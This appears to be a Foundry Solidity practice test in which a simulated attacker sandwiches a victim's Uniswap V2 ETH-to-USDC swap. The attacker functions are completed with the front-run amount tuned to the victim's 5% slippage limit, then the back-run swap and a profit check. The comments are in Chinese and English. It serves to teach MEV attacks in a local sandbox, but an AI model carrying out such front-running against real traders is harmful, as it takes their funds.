// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "forge-std/Test.sol";
import { SandwichSetUp } from "./helper/SandwichSetUp.sol";

contract SandwichPracticeTest is SandwichSetUp {
    address public maker = makeAddr("Maker");
    address public victim = makeAddr("Victim");
    address public attacker = makeAddr("Attacker");
    uint256 public victimUsdcAmountOutMin;
    uint256 makerInitialEthBalance;
    uint256 makerInitialUsdcBalance;
    uint256 attackerInitialEthBalance;
    uint256 victimInitialEthBalance;
    uint256 useEther;
    uint256 maxProfit;
    uint256 optimalSwapEth;

    function setUp() public override {
        super.setUp();

        makerInitialEthBalance = 100 ether;
        makerInitialUsdcBalance = 10_000 * 10 ** usdc.decimals();
        attackerInitialEthBalance = 5 ether;
        victimInitialEthBalance = 1 ether;

        // mint 100 ETH, 10000 USDC to maker
        vm.deal(maker, makerInitialEthBalance);
        usdc.mint(maker, makerInitialUsdcBalance);

        // mint 100 ETH to attacker
        vm.deal(attacker, attackerInitialEthBalance);

        // mint 1 ETH to victim
        vm.deal(victim, victimInitialEthBalance);

        // 1eth : 100 usdc
        // maker provide 100 ETH, 10000 USDC to wethUsdcPool
        vm.startPrank(maker);
        usdc.approve(address(uniswapV2Router), makerInitialUsdcBalance);
        uniswapV2Router.addLiquidityETH{ value: makerInitialEthBalance }(
            address(usdc),
            makerInitialUsdcBalance,
            0,
            0,
            maker,
            block.timestamp
        );
        vm.stopPrank();
    }

    modifier attackerModifier() {
        _attackerAction1();
        _;
        _attackerAction2();
        _checkAttackerProfit();
    }

    // Do not modify this test function
    function test_sandwich_attack_with_profit() public attackerModifier {
        // victim swap 1 ETH to USDC with usdcAmountOutMin
        vm.startPrank(victim);
        address[] memory path = new address[](2);
        path[0] = address(weth);
        path[1] = address(usdc);

        // # Discussion 1: how to get victim tx detail info ?
        // without attacker action, original usdc amount out is 98715803, use 5% slippage
        // originalUsdcAmountOutMin = 93780012;                                 //  93.
        uint256 originalUsdcAmountOut = 98715803;                               //  至少換 98.715803 U
        uint256 originalUsdcAmountOutMin = (originalUsdcAmountOut * 95) / 100;  //  5% slippage

        uniswapV2Router.swapExactETHForTokens{ value: 1 ether }(
            originalUsdcAmountOutMin,
            path,
            victim,
            block.timestamp
        );
        vm.stopPrank();

        // check victim usdc balance >= originalUsdcAmountOutMin (93780012)
        assertGe(usdc.balanceOf(victim), originalUsdcAmountOutMin);
    }

    // # Practice 1: attacker sandwich attack
    function _attackerAction1() internal {
        // victim swap ETH to USDC (front-run victim)
        // implement here
        // attacker 要想辦法讓 victim 換到越少 U 越好，但又要再他可以接受的範圍內
        // victim  至少要用 1eth 換到 93.78001285 U (98715803 * 95 / 100)
        // 也就是說 attacker 要讓 pool 的資產比例達到 1: 93.78001285 是最好的
        // pool 原本的流動池為 100 eth: 10,000 usdc ( 1 eth = 100 usdc)
        // 100 + x : 10000 - y = 1 : 93.78001285

        vm.startPrank(attacker);
        address[] memory path = new address[](2);
        path[0] = address(weth);
        path[1] = address(usdc);
        // 2.614 ether (O) ~ 2.615 ether (X)
        // 1 Ether = 1,000,000,000,000,000,000 Wei
        // 1 Ether = 1,000,000,000 Gwei
        // 1 Ether = 1,000,000 Finney
        uniswapV2Router.swapExactETHForTokens{value: 2614663723502189357}(0, path, attacker, block.timestamp);
        vm.stopPrank();
    }

    // # Practice 2: attacker sandwich attack
    function _attackerAction2() internal {
        // victim swap USDC to ETH
        // implement here
        vm.startPrank(attacker);
        address[] memory path = new address[](2);
        path[0] = address(usdc);
        path[1] = address(weth);
        usdc.approve(address(uniswapV2Router), usdc.balanceOf(attacker));
        // swapExactTokensForETH 會做 usdc.transferFrom 了，所以不用自己做
        // 如果是直接 call swap 的話，才要自己把錢打進 pool 裡
        // usdc.transferFrom(attacker, address(uniswapV2Router), usdc.balanceOf(attacker));
        uniswapV2Router.swapExactTokensForETH(usdc.balanceOf(attacker), 0, path, attacker, block.timestamp);
        vm.stopPrank();
    }

    // # Discussion 2: how to maximize profit ?
    function _checkAttackerProfit() internal {
        uint256 profit = attacker.balance - attackerInitialEthBalance;
        console.log("profit", profit);    // max profit = 34913610775650421
        assertGt(profit, 0);
    }
}
